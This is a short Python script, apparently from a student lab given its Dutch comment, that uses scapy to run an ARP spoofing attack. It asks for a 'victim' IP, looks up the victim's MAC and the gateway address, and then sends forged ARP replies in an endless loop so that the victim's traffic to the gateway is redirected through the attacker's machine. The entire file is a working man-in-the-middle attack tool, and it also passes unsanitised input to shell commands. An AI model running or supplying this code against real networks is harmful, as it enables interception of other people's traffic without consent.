from scapy.all import *
import os
import subprocess
import time

vIP = raw_input("Victim IP address?")

os.system("ping -c 1 " + vIP)
#os.system("arp -n " + vIP)

vMAC = subprocess.check_output("arp -a " + vIP + " | awk '{print $4}' ", shell = True)
gatewayIP = subprocess.check_output("route -n | awk '$1 == \"0.0.0.0\" {print $2}' ", shell = True)

#print gatewayIP
#neem interface als variabele om op 16 en 29 in te vullen

macAttacker = subprocess.check_output("cat /sys/class/net/enp0s3/address", shell = True)

#print macAttacker


arp = Ether() / ARP()
arp[Ether].src = macAttacker
arp[ARP].hwsrc = macAttacker
arp[ARP].psrc = gatewayIP
arp[ARP].hwdst = vMAC
arp[ARP].pdst = vIP

def sendARP():
    sendp(arp, iface="enp0s3")
    time.sleep(2)

	
while True:
    sendARP()


